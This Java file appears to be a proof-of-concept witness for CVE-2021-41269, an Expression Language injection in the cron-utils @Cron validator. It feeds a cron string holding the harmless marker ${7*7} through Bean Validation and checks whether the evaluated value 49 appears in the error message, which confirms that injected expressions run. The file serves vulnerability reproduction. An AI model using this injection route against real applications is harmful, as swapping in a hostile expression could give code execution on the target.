import com.cronutils.model.CronType;
import com.cronutils.validation.Cron;
import javax.validation.*;
import java.util.Set;

/**
 * Witness for CVE-2021-41269 (CWE-94 code injection via EL) in cron-utils.
 * Source: the user-supplied cron expression (a String validated by @Cron).
 * Sink:   ConstraintValidatorContext.buildConstraintViolationWithTemplate(e.getMessage())
 *         in CronValidator.isValid; the Bean Validation provider interpolates EL in the template.
 * We validate a bean whose @Cron field holds a harmless EL arithmetic marker ${7*7}
 * and check whether the produced violation message contains the evaluated value 49.
 */
public class CronUtilsWitness {
  public static class Bean {
    @Cron(type = CronType.SPRING)
    public String expr;
    public Bean(String e){ this.expr = e; }
  }
  public static void main(String[] a) throws Exception {
    String payload = "*/ * * * * ${7*7}";          // 6 SPRING fields; field 0 (*/) fails cleanly, EL marker echoed by outer "Failed to parse %s"
    ValidatorFactory vf;
    try {
      // Bootstrap the Apache BVal provider explicitly (as in the recorded classpath).
      Class<?> prov = Class.forName("org.apache.bval.jsr.ApacheValidationProvider");
      vf = Validation.byProvider((Class) prov).configure().buildValidatorFactory();
    } catch (Throwable t) {
      vf = Validation.buildDefaultValidatorFactory();
    }
    Validator v = vf.getValidator();
    String msg = "";
    try {
      Set<ConstraintViolation<Bean>> vios = v.validate(new Bean(payload));
      for (ConstraintViolation<Bean> c : vios) { msg = String.valueOf(c.getMessage()); break; }
    } catch (Throwable t) {
      msg = t.getClass().getName() + ": " + t.getMessage();
    }
    boolean evaluated = msg.contains("49");          // EL ${7*7} was evaluated -> injection reproduced
    System.out.println("{"
      + "\"subject\":\"cron-utils\",\"cve\":\"CVE-2021-41269\",\"cwe\":\"CWE-94\","
      + "\"source\":\"@Cron String = '" + payload + "'\","
      + "\"sink\":\"buildConstraintViolationWithTemplate(e.getMessage()) in CronValidator.isValid\","
      + "\"witnessed\":" + evaluated + ","
      + "\"evidence\":\"violation message='" + esc(msg) + "' (contains evaluated 49=" + evaluated + ")\"}");
  }
  static String esc(String s){ return s==null?"":s.replace("\\","\\\\").replace("\"","\\\"").replace("\n"," "); }
}
